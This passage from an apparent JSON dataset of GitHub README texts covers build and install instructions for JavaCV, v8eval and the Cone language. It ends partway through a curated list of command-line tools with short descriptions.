frame.dispose();\r\n        recorder.stop();\r\n        grabber.stop();\r\n    }\r\n}\r\n```\r\n\r\nFurthermore, after creating a `pom.xml` file with the following content:\r\n```xml\r\n<project>\r\n    <modelVersion>4.0.0<\/modelVersion>\r\n    <groupId>org.bytedeco.javacv<\/groupId>\r\n    <artifactId>demo<\/artifactId>\r\n    <version>1.5.2<\/version>\r\n    <properties>\r\n        <maven.compiler.source>1.7<\/maven.compiler.source>\r\n        <maven.compiler.target>1.7<\/maven.compiler.target>\r\n    <\/properties>\r\n    <dependencies>\r\n        <dependency>\r\n            <groupId>org.bytedeco<\/groupId>\r\n            <artifactId>javacv-platform<\/artifactId>\r\n            <version>1.5.2<\/version>\r\n        <\/dependency>\r\n    <\/dependencies>\r\n    <build>\r\n        <sourceDirectory>.<\/sourceDirectory>\r\n    <\/build>\r\n<\/project>\r\n```\r\n\r\nAnd by placing the source code above in `Demo.java`, or similarly for other classes found in the [`samples`](samples), we can use the following command to have everything first installed automatically and then executed by Maven:\r\n```bash\r\n $ mvn compile exec:java -Dexec.mainClass=Demo\r\n```\r\n\r\n**Note**: In case of errors, please make sure that the `artifactId` in the `pom.xml` file reads `javacv-platform`, not `javacv` only, for example. The artifact `javacv-platform` adds all the necessary binary dependencies.\r\n\r\n\r\nBuild Instructions\r\n------------------\r\nIf the binary files available above are not enough for your needs, you might need to rebuild them from the source code. To this end, the project files were created for:\r\n\r\n * Maven 3.x  http:\/\/maven.apache.org\/download.html\r\n * JavaCPP 1.5.2  https:\/\/github.com\/bytedeco\/javacpp\r\n * JavaCPP Presets 1.5.2  https:\/\/github.com\/bytedeco\/javacpp-presets\r\n\r\nOnce installed, simply call the usual `mvn install` command for JavaCPP, its Presets, and JavaCV. By default, no other dependencies than a C++ compiler for JavaCPP are required. Please refer to the comments inside the `pom.xml` files for further details.\r\n\r\nInstead of building the native libraries manually, we can run `mvn install` for JavaCV only and rely on the snapshot artifacts from the CI builds:\r\n\r\n * http:\/\/bytedeco.org\/builds\/\r\n\r\n\r\n----\r\nProject lead: Samuel Audet [samuel.audet `at` gmail.com](mailto:samuel.audet&nbsp;at&nbsp;gmail.com)  \r\nDeveloper site: https:\/\/github.com\/bytedeco\/javacv  \r\nDiscussion group: http:\/\/groups.google.com\/group\/javacv\r\n"},{"repo":"\/sony\/v8eval","language":"C++","readme_contents":"# v8eval\n\n[![PyPI version](https:\/\/badge.fury.io\/py\/v8eval.svg)](http:\/\/badge.fury.io\/py\/v8eval)\n[![Gem Version](https:\/\/badge.fury.io\/rb\/v8eval.svg)](https:\/\/badge.fury.io\/rb\/v8eval)\n[![GoDoc](https:\/\/godoc.org\/github.com\/sony\/v8eval\/go\/v8eval?status.svg)](http:\/\/godoc.org\/github.com\/sony\/v8eval\/go\/v8eval)\n\nMulti-language bindings to JavaScript engine V8.\n\nCurrently v8eval provides Go, Python and Ruby bindings to the latest V8 7.1 and supports Linux and Mac OS X.\nv8eval uses SWIG and can be extended easily for other languages.\n\n## Pre-installation\n\n#### Linux\n\nSee [Dockerfile](https:\/\/github.com\/sony\/v8eval\/blob\/master\/Dockerfile).\n\n#### Mac\n\nSee [.travis.yml](https:\/\/github.com\/sony\/v8eval\/blob\/master\/.travis.yml).\n\n## Installation\n\nThe installation takes several tens of minutes due to V8 build.\n\n#### Go\n\nv8eval requires Go 1.10 or later.\n\n```\ngit clone https:\/\/github.com\/sony\/v8eval.git ${GOPATH}\/src\/github.com\/sony\/v8eval\n${GOPATH}\/src\/github.com\/sony\/v8eval\/go\/build.sh install\n```\n\nIn the case of Linux, you need to build your Go program with `build.sh`:\n\n```\n${GOPATH}\/src\/github.com\/sony\/v8eval\/go\/build.sh go build\n```\n\n#### Python\n\n```\npip install v8eval\n```\n\n#### Ruby\n\n```\ngem install v8eval\n```\n\n## Documentation\n\n#### Go\n\nSee [godoc.org](http:\/\/godoc.org\/github.com\/sony\/v8eval\/go\/v8eval).\n\n#### Python\n\nYou can create the Sphinx documentation under python\/docs.\n\n```\npython\/build.sh docs\n```\n\n#### Ruby\n\nYou can create the YARD documentation under ruby\/doc.\n\n```\nruby\/build.sh docs\n```\n\n## Examples\n\n#### Go\n\n```go\nimport \"github.com\/sony\/v8eval\/go\/v8eval\"\n\nfunc Add(x, y int) int {\n\tvar v8 = v8eval.NewV8()\n\tv8.Eval(\"var add = (x, y) => x + y;\", nil)\n\n\tvar sum int\n\tv8.Call(\"add\", []int{x, y}, &sum)\n\treturn sum\n}\n```\n\n#### Python\n\n```python\nimport v8eval\n\ndef add(x, y):\n    v8 = v8eval.V8()\n    v8.eval('var add = (x, y) => x + y;')\n    return v8.call('add', [x, y])\n```\n\n#### Ruby\n\n```ruby\nrequire 'v8eval'\n\ndef add(x, y)\n  v8 = V8Eval::V8.new\n  v8.eval('var add = (x, y) => x + y;')\n  v8.call('add', [x, y])\nend\n```\n\n## License\n\nThe MIT License (MIT)\n\nSee [LICENSE](https:\/\/github.com\/sony\/v8eval\/blob\/master\/LICENSE) for details.\n"},{"repo":"\/jondgoodwin\/cone","language":"C","readme_contents":"# Cone Programming Language\nCone is a fast, fit, friendly, and safe systems programming language.\nIt features:\n\n- Do-it-your-way memory management\n- Versatile type system (incl. variant types and slices)\n- Memory, thread & type safe\n- Extensive code reuse features\n- Lean, native runtime\n- Concise, readable syntax\n\nThe Cone compiler is currently under development.\nThe current status and next steps are documented in [PLAN.md][plan].\n\n## Documentation and Other Resources\n\n - [Cone web site](http:\/\/cone.jondgoodwin.com)\n - [Web-based playground][playground], offering pre-built examples in a drop-down\n - [Cone Language Reference][coneref] documentation\n - [Programming Linguistics blog](http:\/\/pling.jondgoodwin.com)\n \nThe [Cone home repository](https:\/\/github.com\/jondgoodwin\/conehome)\noffers a rudimentary build environment for Cone programs,\nincluding the Congo build tool and additional example Cone programs.\n\n## Language Features\n\nWhen finished, Cone will support these features:\n\n- Readable, modular marriage of 3D content and behavior:\n  - Simple, outline-like declarative syntax for content\n  - Procedural generation and behavior interwoven in content\n  - Snap-together, Internet-hosted, url-located parts\n- Compile-time memory, type, and concurrency safety checks\n- [Gradual memory management][gmm]: safely manage memory your way\n  - Lexical, single-owner strategy for performance\n  - Ref-counted or tracing GC for flexibility\n  - Lifetime-constrained references for performance\/simplicity\n  - Custom allocators (pools\/arenas) for performance\n- Lightweight concurrency\n  - Co-routines, threads and actors\n  - Lockless and locked permissions for safe data sharing\n- Robust type system\n  - Sum types, structs, arrays, slices, ranges, aliases\n  - struct subtyping via trait, interface, & parent inheritance\n  - Attach methods to any type\n- Modules, macros, templates and meta-programming\n- Extensible pattern matching\n  - Type-defined '~~' match operator\n  - 'match' blocks using custom match methods\n  - Content extraction during matching\n- Functions, Methods and Closures\n  - Multiple return values and implicit return\n  - Computed properties\n- 'do' block for context management\n- Concise, readable code:\n  - 'this'-implied prefix operators for method cascading, etc.\n  - Operator overloading\n  - Control clauses for 'if', 'while', 'each'\n  - Type inference\n  - Parallel assignment\n  - Auto-detected off-side rule\n  - Blocks and 'if' are expressions\n- Unicode-aware (UTF8) text strings and variable names\n- Fast compilation and convenient packaging\n\n## Building (Windows)\n\nA Visual Studio C++ solution can be created using the Cone.vcxproj project file.\nThe generated object and executable files are created relative to the location of the \nsolutions file. The build depends on [LLVM 7][llvm] being installed and available at $(LLVMDIR).\n\n## Building (Linux)\n\nTo build on Linux:\n\n\tsudo apt-get install llvm-7.0-dev\n\tcmake .\n\tmake\n\nNote: To generate WebAssembly, it is necessary to custom-build LLVM, e.g.:\n\n\tmkdir llvm\n\tcd llvm\n\tsvn co http:\/\/llvm.org\/svn\/llvm-project\/llvm\/trunk llvm-src\n\tcd llvm-src\/tools\n\tsvn co http:\/\/llvm.org\/svn\/llvm-project\/cfe\/trunk clang\n\tsvn co http:\/\/llvm.org\/svn\/llvm-project\/lld\/trunk lld\n\tcd ..\/..\n\tmkdir llvm-build\n\tcd llvm-build\n\tCC=clang CXX=clang++ cmake -G \"Unix Makefiles\" -DLLVM_BUILD_LLVM_DYLIB=ON -DCMAKE_INSTALL_PREFIX=\/llvm\/wasm -DLLVM_EXPERIMENTAL_TARGETS_TO_BUILD=WebAssembly \/llvm\/llvm-src\n\tmake\n\tmake install\n\n## Building (Mac OS)\n\nTo build on Mac OS:\n\n\tbrew install --with-toolchain llvm\n\tllvm-config --bindir\n\nCMake will auto-detect LLVM, so all you should need to do:\n\n\tcmake .\n\tmake\n\n## License\n\nThe Cone programming language compiler is distributed under the terms of the MIT license. \nSee LICENSE and COPYRIGHT for details.\n\n[3dweb]: http:\/\/cone.jondgoodwin.com\/web3d.html\n[gmm]: http:\/\/jondgoodwin.com\/pling\/gmm.pdf\n[plan]: https:\/\/github.com\/jondgoodwin\/cone\/blob\/master\/PLAN.md\n[coneref]: http:\/\/cone.jondgoodwin.com\/coneref\/index.html\n[showcase]: http:\/\/cone.jondgoodwin.com\/coneref\/showcase.html\n[playground]: http:\/\/cone.jondgoodwin.com\/play\/index.html\n[examples]: http:\/\/github.com\/jondgoodwin\/cone\/tree\/master\/text\n[acorn]: https:\/\/github.com\/jondgoodwin\/acornvm\n[acornref]: http:\/\/web3d.jondgoodwin.com\/acorn\n[llvm]: https:\/\/llvm.org\/\n\n[hello]: http:\/\/cone.jondgoodwin.com\/play\/index.html?gist=f55a8caa2605a11223437167730c53af\n[pi]: http:\/\/cone.jondgoodwin.com\/play\/index.html?gist=4510655502edcde9d50d185cfd7f3c2e\n[perm]: http:\/\/cone.jondgoodwin.com\/play\/index.html?gist=96ecaecb4827c2b9e6aaad35feb2bfd1\n[struct]: http:\/\/cone.jondgoodwin.com\/play\/index.html?gist=cd702c7c1ffc8f97d7762735d04fd9de\n"},{"repo":"\/herrbischoff\/awesome-command-line-apps","language":null,"readme_contents":"<img src=\"https:\/\/cdn.rawgit.com\/herrbischoff\/awesome-command-line-apps\/master\/assets\/logo.svg\" width=\"600\">\n\n> A curated list of useful command line apps, in celebration of the TUI.\n>\n> _\u201cKnowledge brings fear\u201d (Mars University Mission Statement)_\n\n[![Awesome](https:\/\/cdn.rawgit.com\/sindresorhus\/awesome\/d7305f38d29fed78fa85652e3a63e154dd8e8829\/media\/badge.svg)](https:\/\/github.com\/sindresorhus\/awesome) [![Build Status](https:\/\/travis-ci.org\/herrbischoff\/awesome-command-line-apps.svg?branch=master)](https:\/\/travis-ci.org\/herrbischoff\/awesome-command-line-apps)\n\nIf you want to contribute, you are highly encouraged to do so. Please read the [contribution guidelines](contributing.md).\n\n\n## Caffeinating\n\nWhen you find something helpful in here, you could buy me a coffee. I spend a lot of time and effort on curating this list. Keeping me properly caffeinated accelerates things. And it would really make my day. Kindness of strangers and all that. If you can't or won't, no hard feelings. It's available completely free for a reason. Still, it would be awesome.\n\n<a href=\"https:\/\/www.buymeacoffee.com\/Oi5LPJ4lr\" target=\"_blank\"><img src=\"https:\/\/bmc-cdn.nyc3.digitaloceanspaces.com\/BMC-button-images\/custom_images\/orange_img.png\" alt=\"Buy Me A Coffee\" style=\"height: auto !important;width: auto !important;\" ><\/a>\n\n\n## Contents\n\n- [\\*nix\/\\*nux](#nixnux)\n    - [Automation](#automation)\n    - [Backup](#backup)\n    - [Benchmarking](#benchmarking)\n    - [Cloud Services](#cloud-services)\n    - [Compression](#compression)\n    - [Content Creation](#content-creation)\n    - [Conversion](#conversion)\n    - [Data Processing](#data-processing)\n    - [Databases](#databases)\n    - [Developer](#developer)\n    - [Dotfile Management](#dotfile-management)\n    - [Download Utilities](#download-utilities)\n    - [Email](#email)\n    - [Encryption](#encryption)\n    - [Filesystem Management](#filesystem-management)\n    - [FTP](#ftp)\n    - [Games](#games)\n    - [IRC](#irc)\n    - [Media](#media)\n    - [Miscellaneous](#miscellaneous)\n    - [Networking](#networking)\n    - [Presentation](#presentation)\n    - [Productivity](#productivity)\n    - [RSS](#rss)\n    - [Searching](#searching)\n    - [Security](#security)\n    - [SSH](#ssh)\n    - [System](#system)\n    - [Terminal](#terminal)\n    - [Text Editors](#text-editors)\n    - [Version Control](#version-control)\n    - [VPN](#vpn)\n    - [World Wide Web](#world-wide-web)\n- [BSD](#bsd)\n- [Linux](#linux)\n- [Mac OS X](#mac-os-x)\n- [Helpers](#helpers)\n\n\n## \\*nix\/\\*nux\n\n### Automation\n\n- [Ansible](https:\/\/www.ansible.com) - Automate deployment, configuration, and upgrading.\n- [fswatch](https:\/\/github.com\/emcrisostomo\/fswatch) - Cross-platform file change monitor with multiple backends.\n\n### Backup\n\n- [Amanda](http:\/\/www.amanda.org) - Open Source Network Backup for Linux, Windows, UNIX and OS X.\n- [Attic](https:\/\/attic-backup.org) - Deduplicating backup program written in Python.\n- [Bacula](http:\/\/blog.bacula.org) - Manage backups, recovery, and verification of computer data across a network of computers of different kinds.\n- [BorgBackup](https:\/\/github.com\/borgbackup\/borg) - Significantly improved fork of Attic.\n- [duply](http:\/\/duply.net) - Easily create GPG encrypted, compressed backups of any data almost anywhere.\n- [mysqldump-secure](https:\/\/github.com\/cytopia\/mysqldump-secure) - Secure mysqldump script with encryption, compression, logging, blacklisting and Nagios monitoring integration.\n\n\n### Benchmarking\n\n- [hyperfine](https:\/\/github.com\/sharkdp\/hyperfine) - Benchmark commands through the command line.\n- [loadtest](https:\/\/github.com\/alexfernandez\/loadtest) - Runs a load test on the selected HTTP URL.\n- [pv](http:\/\/www.ivarch.com\/programs\/pv.shtml) - Terminal-based tool for monitoring the progress of data through a pipeline.\n- [siege](https:\/\/www.joedog.org\/siege-home\/) - http load testing and benchmarking utility.\n\n### Cloud Services\n\n- [awless](https:\/\/github.com\/wallix\/awless) - A mighty command line interface for Amazon Web Services.\n- [awscli](https:\/\/aws.amazon.com\/cli\/) - Official Amazon AWS command-line interface.\n- [cadaver](http:\/\/www.webdav.org\/cadaver\/) - Command-line WebDAV client for Unix.\n\n### Compression\n\n- [archivemount](http:\/\/www.cybernoia.de\/software\/archivemount.html) - FUSE filesystem using libarchive to mount archives.\n- [dtrx](https:\/\/github.com\/moonpyk\/dtrx) - Takes all the hassle out of extracting archives.\n\n### Content Creation\n\n- [GitBook](https:\/\/www.npmjs.com\/package\/gitbook) - Library and cmd utility to generate GitBooks.\n\n### Conversion\n\n- [binchunker](http:\/\/he.fi\/bchunk\/) - Converts a CD image in a \".bin \/ .cue\" format (sometimes \".raw \/ .cue\") to a set of .iso and .cdr tracks.\n- [Echo](https:\/\/github.com\/misterGF\/echo) - Convert HTML tables to JSON\/CSVs.\n- [Pandoc](http:\/\/pandoc.org\/) - A universal document converter.\n\n### Databases\n\n- [mycli](http:\/\/mycli.net) - Command line interface for MySQL, MariaDB, and Percona with auto-completion and syntax highlighting.\n- [pgcli](http:\/\/pgcli.com) - Command line interface for Postgres with auto-completion and syntax highlighting.\n\n### Data Processing\n\n- [datamash](https:\/\/www.gnu.org\/software\/datamash\/) - Perform basic numeric, textual and statistical operations on textual data files.\n- [edcount](https:\/\/github.com\/haroldfreeman\/edcount) - Estimate distinct count of values from standard input.\n- [jq](https:\/\/stedolan.github.io\/jq\/) - Lightweight and flexible command-line JSON processor.\n\n### Developer\n\n- [bat](https:\/\/github.com\/astaxie\/bat) - Go implement CLI, cURL-like tool for humans.\n- [bcal](https:\/\/github.com\/jarun\/bcal) - Byte CALculator for storage conversions and calculations.\n- [bitwise](https:\/\/github.com\/mellowcandle\/bitwise) - Terminal based interactive bit manipulator in curses.\n- [caniuse-cmd](https:\/\/github.com\/sgentle\/caniuse-cmd) - All the power of caniuse.com with none of the GUI.\n- [clog](https:\/\/github.com\/kentcdodds\/clog-cli) - A conventional changelog for the rest of us.\n- [Cookiecutter](https:\/\/github.com\/audreyr\/cookiecutter) - Command-line utility that creates projects from cookiecutters (project templates).\n- [Critical](https:\/\/github.com\/addyosmani\/critical) - Extract & Inline Critical-path CSS in HTML pages.\n- [Grunt](http:\/\/gruntjs.com) - The JavaScript Task Runner.\n- [gulp](http:\/\/gulpjs.com) - Automate and enhance your build workflow.\n- [how2](https:\/\/github.com\/santinic\/how2) - stackoverflow from the terminal.\n- [http-prompt](https:\/\/github.com\/eliangcs\/http-prompt) - Interactive command-line HTTP client featuring autocomplete and syntax highlighting, built on HTTPie and prompt_toolkit.\n- [HTTPie](https:\/\/github.com\/jkbrzt\/httpie) - User-friendly cURL replacement featuring intuitive UI, JSON support, syntax highlighting, wget-like downloads, extensions, etc.\n- [penthouse](https:\/\/github.com\/pocketjoso\/penthouse) - Critical Path CSS Generator.\n- [Publoy](http:\/\/abhiomkar.github.io\/publoy\/) - Command line tool to deploy your static webapps via Dropbox.\n- [Rebound](https:\/\/github.com\/shobrook\/rebound) - Instantly fetch Stack Overflow results when you get a compiler error.\n- [saws](https:\/\/github.com\/donnemartin\/saws) - Supercharged AWS Command Line Interface.\n- [sift](https:\/\/sift-tool.org) - Fast and powerful open source alternative to grep.\n- [Yarn](https:\/\/yarnpkg.com) - Deterministic, secure alternative to npm.\n\n### Dotfile Management\n\n- [dotdrop](https:\/\/github.com\/deadc0de6\/dotdrop) - Save your dotfiles once, deploy them everywhere.\n- [homeshick](https:\/\/github.com\/andsens\/homeshick) - Git dotfiles synchronizer written in bash.\n\n### Download Utilities\n\n- [aria2](http:\/\/aria2.sourceforge.net) - Lightweight multi-protocol & multi-source command-line download utility.\n- [peerflix](https:\/\/github.com\/mafintosh\/peerflix) - Streaming torrent client for node.js.\n\n### Email\n\n- [abook](http:\/\/abook.sourceforge.net\/) - text-based addressbook program designed to use with mutt mail client.\n- [Alpine](http:\/\/alpine.x10host.com\/alpine\/) - Fast, easy to use email client that is suitable for both the inexperienced email user as well as for the most demanding of power users.\n- [imapsync](https:\/\/github.com\/imapsync\/imapsync) - IMAP synchronisation, sync, copy or migration tool.\n- [isync](http:\/\/isync.sourceforge.net\/) - Command line application to synchronize Maildir and IMAP4 mailboxes both ways.\n- [Mutt](http:\/\/www.mutt.org) - All mail clients suck. This one just sucks less.\n- [Notmuch](https:\/\/notmuchmail.org) - Fast, global-search and tag-based email system.\n- [OfflineIMAP](https:\/\/github.com\/OfflineIMAP\/offlineimap) - Two-way sync your e-mail mailboxes as a local Maildir.\n- [piler](http:\/\/www.mailpiler.org\/wiki\/start) - Feature rich open source email archiving solution, and a viable alternative to commercial email archiving products.\n- [Sup](https:\/\/github.com\/sup-heliotrope\/sup) - A curses threads-with-tags style email client.\n- [Terjira](https:\/\/github.com\/keepcosmos\/terjira) - Command line power tool for Jira.\n\n### Encryption\n\n- [EncFS](https:\/\/vgough.github.io\/encfs\/) - Provides an encrypted filesystem in user-space.\n- [GnuPG](https:\/\/www.gnupg.org) - Complete and free implementation of the OpenPGP standard as defined by RFC4880 (also known as PGP).\n\n### Filesystem Management\n\n- [FDUPES](https:\/\/github.com\/adrianlopezroche\/fdupes) - Identify or delete duplicate files residing within specified directories.\n- [Midnight Commander](http:\/\/www.midnight-commander.org) - Feature rich visual file manager.\n- [Ncdu](https:\/\/dev.yorhel.nl\/ncdu) - Disk usage analyzer with an ncurses interface.\n- [ranger](http:\/\/ranger.nongnu.org\/) - Minimalistic visual file manager featuring curses interface with VI key bindings.\n- [vifm](http:\/\/vifm.info) - ncurses based file manager with vi like keybindings\/modes\/options\/commands\/configuration, which also borrows some useful ideas from mutt.\n- [zfsnap](http:\/\/www.zfsnap.org\/) - Rolling ZFS snapshots the easy way.\n\n### FTP\n\n- [CurlFtpFS](http:\/\/curlftpfs.sourceforge.net\/) - Filesystem for accessing FTP hosts based on FUSE and libcurl.\n- [LFTP](http:\/\/lftp.tech\/) - Sophisticated ftp\/http client, and a file transfer program supporting a number of network protocols.\n- [NcFTP](http:\/\/www.ncftp.com\/ncftp\/) - A set of free application programs implementing the File Transfer Protocol (FTP).\n\n### Games\n\n- [Angband](http:\/\/rephial.org\/) - Angband is a free, single-player dungeon exploration game.\n- [Cataclysm: Dark Days Ahead](http:\/\/en.cataclysmdda.com\/) - Roguelike set in a post-apocalyptic world.\n- [Curse of War](https:\/\/a-nikolaev.github.io\/curseofwar\/) - Fast-paced real-time action strategy game.\n- [dopewars](http:\/\/dopewars.sourceforge.net) - Deal in drugs on the streets of New York, amassing a huge fortune and paying off the loan shark, while avoiding the ever-annoying police.\n- [Frotz](http:\/\/frotz.sourceforge.net\/) - Interpreter for Infocom games and other Z-machine games.\n- [Nethack](http:\/\/nethack.org) - Single player dungeon exploration game that runs on a wide variety of computer systems.\n- [vitetris](http:\/\/www.victornils.net\/tetris\/) - Terminal-based Tetris clone, much like the early Tetris games by Nintendo.\n\n### IRC\n\n- [BitlBee](https:\/\/www.bitlbee.org\/main.php\/news.r.html) - IRC to other chat networks gateway.\n- [Irssi](https:\/\/github.com\/irssi\/irssi) - The client of the future.\n- [WeeChat](https:\/\/weechat.org\/) - WeeChat is a fast, light and extensible chat client.\n\n### Media\n\n- [abcde](https:\/\/abcde.einval.com\/wiki\/) - A Better CD Encoder.\n- [AtomicParsely](http:\/\/atomicparsley.sourceforge.net\/) - Lightweight command line program for reading, parsing and setting metadata into MPEG-4 files.\n- [Audiogrep](https:\/\/antiboredom.github.io\/audiogrep\/) - Creates audio supercuts.\n- [Beets](http:\/\/beets.io\/) - The music geek's media organizer.\n- [cmus](https:\/\/cmus.github.io) - Small, fast and powerful console music player for Unix-like operating systems.\n- [FFmpeg](http:\/\/ffmpeg.org) - A complete, cross-platform solution to record, convert and stream audio and video.\n- [Gifsicle](http:\/\/www.lcdf.org\/gifsicle\/) - Command-line tool for creating, editing, and getting information about GIF images and animations.\n- [HandBrakeCLI](https:\/\/handbrake.fr) - Tool for converting video from nearly any format to a selection of modern, widely supported codecs.\n- [Legofy](https:\/\/github.com\/JuanPotato\/Legofy) - Python program that takes a static image or gif and makes it so that it looks as if it was built out of LEGO.\n- [MediaInfo](http:\/\/mediaarea.net\/en\/MediaInfo) - Convenient unified display of the most relevant technical and tag data for video and audio files.\n- [MKVToolNix](https:\/\/mkvtoolnix.download\/) - A set of tools to create, alter and inspect Matroska files under Linux, other Unices and Windows.\n- [mopidy](https:\/\/www.mopidy.com\/) - Self hosted MPD daemon that connects to Spotify and Soundcloud.\n- [moviemon](https:\/\/github.com\/iCHAIT\/moviemon) - Everything about your movies within the command line.\n- [mp3fs](https:\/\/khenriks.github.io\/mp3fs\/) - FUSE-based transcoding filesystem from FLAC to MP3.\n- [mp4v2](https:\/\/code.google.com\/archive\/p\/mp4v2) - Library and tools to provide functions to read, create, and modify mp4 files.\n- [mpg123](http:\/\/mpg123.org) - Fast console MPEG Audio Player and decoder library.\n- [ncmpcpp](http:\/\/rybczak.net\/ncmpcpp\/) - NCurses based MPD client.\n- [OptiPNG](http:\/\/optipng.sourceforge.net) - PNG optimizer that recompresses image files to a smaller size, without losing any information.\n- [Pngcrush](http:\/\/pmt.sourceforge.net\/pngcrush\/) - An optimizer for PNG (Portable Network Graphics) files.\n- [Shellpic](https:\/\/github.com\/larsjsol\/shellpic) - Display images inline in the shell, ASCII-art is so 2013.\n- [subdownloader](https:\/\/github.com\/beatfreaker\/subdownloader) - Downloading subtitles for one or more files is just a command away.\n- [ttystudio](https:\/\/github.com\/chjj\/ttystudio) - A terminal-to-gif recorder minus the headaches.\n- [Video Transcoding Scripts](https:\/\/github.com\/donmelton\/video-transcoding-scripts) - Utilities to transcode, inspect and convert videos.\n- [Videogrep](https:\/\/antiboredom.github.io\/videogrep\/) - Automatic supercuts with python.\n- [youtube-dl](http:\/\/rg3.github.io\/youtube-dl\/) - A small command-line program to download videos from YouTube.com and a few more sites.\n\n### Miscellaneous\n\n- [ansiweather](https:\/\/github.com\/fcambus\/ansiweather) - Weather in your terminal, with ANSI colors and Unicode symbols.\n- [cointop](https:\/\/github.com\/miguelmota\/cointop) - Interactive cryptocurrency tracking.\n- [FIGlet](http:\/\/www.figlet.org) - Program for making large letters out of ordinary text.\n- [license](https:\/\/nishanths.github.io\/license\/) - Create LICENSEs from the command-line.\n- [pockyt](https:\/\/github.com\/arvindch\/pockyt) - composable [Pocket](https:\/\/getpocket.com) client for the terminal.\n- [wego](https:\/\/github.com\/schachmat\/wego\/) - Weather client for the terminal.\n\n### Networking\n\n- [Bandwidth Monitor NG](https:\/\/www.gropp.org\/?id=projects&sub=bwm-ng) - Small and simple console-based live network and disk io bandwidth monitor.\n- [Blucat](http:\/\/blucat.sourceforge.net\/blucat\/) - netcat for Bluetooth.\n- [gping](https:\/\/github.com\/orf\/gping) - Ping, but with a graph.\n- [iftop](http:\/\/www.ex-parrot.com\/pdw\/iftop\/) - Display bandwidth usage on an interface.\n- [localtunnel](https:\/\/github.com\/localtunnel\/localtunnel) - Exposes your localhost to the world for easy testing and sharing.\n- [mtr](http:\/\/www.bitwizard.nl\/mtr\/) - Combines the functionality of the 'traceroute' and 'ping' programs in a single network diagnostic tool.\n- [Netcat](http:\/\/netcat.sourceforge.net) - Networking utility which reads and writes data across network connections, using the TCP\/IP protocol.\n- [Nethogs](https:\/\/github.com\/raboof\/nethogs) - Linux 'net top' tool.\n- [ngrep](http:\/\/ngrep.sourceforge.net) - grep as a network packet analyzer.\n- [nmap](https:\/\/nmap.org) - Network discovery and security auditing utility.\n- [vnStat](http:\/\/humdi.net\/vnstat\/) - Console-based network traffic monitor for Linux and BSD that keeps a log of network traffic for the selected interface(s).\n\n### Presentation\n\n- [termui](https:\/\/github.com\/gizak\/termui) - Cross-platform, easy-to-compile, and fully-customizable terminal dashboard.\n- [WOPR](https:\/\/github.com\/yaronn\/wopr) - Simple markup language for creating rich terminal reports, presentations and infographics.\n\n### Productivity\n\n- [doing](http:\/\/brettterpstra.com\/projects\/doing\/) - A command line tool for keeping track of what you\u2019re doing and tracking what you\u2019ve done.\n- [idea](https:\/\/github.com\/IonicaBizau\/idea) - Lightweight CLI tool and module for keeping ideas in a safe place quick and easy.\n- [ledger](http:\/\/ledger-cli.org) - Powerful, double-entry accounting system that is accessed from the UNIX command-line.\n- [MapSCII](https:\/\/github.com\/rastapasta\/mapscii) - OpenStreetMap client, renders an explorable Braille & ASCII world map.\n- [pdfgrep](https:\/\/pdfgrep.org) - Command line utility to search text in PDF files.\n- [pin-cushion](https:\/\/github.com\/ELLIOTTCABLE\/pin-cushion) - Simple, maintained CLI interface to the Pinboard.in API.\n- [Remind](https:\/\/www.roaringpenguin.com\/products\/remind) - Sophisticated calendar and alarm program.\n- [SC-IM](https:\/\/github.com\/andmarti1424\/sc-im) - An ncurses-based spreadsheet application.\n- [Taskwarrior](http:\/\/taskwarrior.org) - Free and Open Source Software that manages your TODO list from your command line.\n- [Timetrap](https:\/\/github.com\/samg\/timetrap) - Simple command line timetracker.\n- [Watson](http:\/\/tailordev.github.io\/Watson\/) - Elegant time tracking with a CLI.\n- [woof](http:\/\/www.home.unix-ag.org\/simon\/woof.html) - Simple one-off HTTP file sharing.\n\n### RSS\n\n- [newsbeuter](https:\/\/www.newsbeuter.org) - The Mutt of RSS feed readers.\n- [rss2email](http:\/\/www.allthingsrss.com\/rss2email\/) - A free, open-source tool for Windows and UNIX for getting news from RSS feeds in email.\n\n### Searching\n\n- [fd](https:\/\/github.com\/sharkdp\/fd) - fd is a simple, fast and user-friendly alternative to 'find'.\n- [fselect](https:\/\/github.com\/jhspetersson\/fselect) - 'find' replacement with SQL-like syntax.\n- [ripgrep](https:\/\/github.com\/BurntSushi\/ripgrep) - Recursively search directories for a regex pattern extremely fast.\n- [The Silver Searcher](http:\/\/geoff.greer.fm\/ag\/) - A blazingly fast tool for searching code.\n\n### Security\n\n- [Aircrack-ng](http:\/\/aircrack-ng.org) - 802.11 WEP and WPA-PSK keys cracking program that can recover keys once enough data packets have been captured.\n- [Let's Encrypt](https:\/\/letsencrypt.org) - A free, automated and open Certificate Authority.\n\n### SSH\n\n- [autossh](http:\/\/www.harding.motd.ca\/autossh\/) - Automatically restart SSH sessions and tunnels.\n- [sshfs](https:\/\/github.com\/libfuse\/sshfs) - Locally mount a remote folder via SSH.\n- [storm](http:\/\/stormssh.readthedocs.io\/en\/master\/) - A command line tool to manage your ssh connections.\n\n### System\n\n- [ApacheTop](http:\/\/freecode.com\/projects\/apachetop) - Curses-based top-like display for Apache information, including requests per second, bytes per second, most popular URLs, etc.\n- [dstat](http:\/\/dag.wiee.rs\/home-made\/dstat\/) - Versatile replacement for vmstat, iostat, netstat and ifstat.\n- [htop](http:\/\/hisham.hm\/htop\/) - An interactive process viewer.\n- [iotop](http:\/\/repo.or.cz\/iotop.git) - Find out what's stressing and increasing load on your hard disks.\n- [maybe](https:\/\/github.com\/p-e-w\/maybe) - See what a program does before deciding whether you really want it to happen.\n- [netboot.xyz](https:\/\/netboot.xyz) - Boot multiple Operating System installers or utilities over the network from a single menu.\n- [screenFetch](https:\/\/github.com\/KittyKatt\/screenFetch) - Fetches system\/theme information in terminal for desktop screenshots.\n\n### Terminal\n\n- [asciinema](https:\/\/asciinema.org) - Free and open source solution for recording terminal sessions and sharing them on the web.\n- [autojump](https:\/\/github.com\/wting\/autojump) - A cd command that learns - easily navigate directories from the command line.\n- [bgrep](http:\/\/debugmo.de\/2009\/04\/bgrep-a-binary-grep\/) - Like grep but for binary strings.\n- [byobu](http:\/\/byobu.co) - Text-based window manager and terminal multiplexer.\n- [ccat](https:\/\/github.com\/jingweno\/ccat) - Colorizing the cat command.\n- [cheat](https:\/\/github.com\/chrisallenlane\/cheat) - Create and view interactive cheatsheets on the command-line.\n- [desk](https:\/\/github.com\/jamesob\/desk) - Lightweight workspace manager for the shell.\n- [dit](https:\/\/github.com\/vulpino\/dit) - Dotfile manager that hooks into git.\n- [Fisherman](https:\/\/github.com\/fisherman\/fisherman) - A blazing fast, modern plugin manager for fish shell.\n- [fundle](https:\/\/github.com\/tuvistavie\/fundle) - Minimalist package manager for fish shell.\n- 